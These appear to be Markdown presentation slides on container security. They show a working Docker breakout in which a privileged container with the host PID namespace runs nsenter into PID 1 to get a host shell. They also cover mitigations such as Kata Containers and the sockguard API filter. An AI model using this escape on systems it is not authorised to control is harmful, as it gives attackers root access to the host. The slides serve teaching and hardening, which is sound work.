## Privileged Containers

### Privileged containers have access to all syscalls

If able to start containers, just leave the isolation:

```bash
docker run -it \
    --privileged \
    --pid=host \
    alpine \
	nsenter -t 1 -m -u -n -i sh
```

### Parameters of `nsenter`

- Work with namespaces (`nsenter`)
- Uses process tree of host (`--pid=host`)
- Get namespace from PID 1 (`-t 1`)
- Enter namespaces required for shell (`-m -u -n -i`)

--

## Demo: Privileged Containers

Running privileged containers:

```bash
docker run -it --rm --privileged --pid host alpine
```

Host breakout from privileged container:

```bash
nsenter -t 1 -m -u -n -i sh
```

--

## Taming Privileges Containers

### For example

![](https://katacontainers.io/assets/img/logo_white.e69d7ea6.svg) <!-- .element: style="width: 35%" -->

Isolates containers in a lightweight VM

Configured as a container runtime (instead of `runc`)

XXX demo?

--

## Docker Engine API Filter

For example [`sockguard`](https://github.com/buildkite/sockguard)

- No privileged containers
- No host bind mounts
- No host network

```bash
/sockguard \
    -upstream-socket /var/run/docker-raw.sock \
    -filename /var/run/docker.sock
```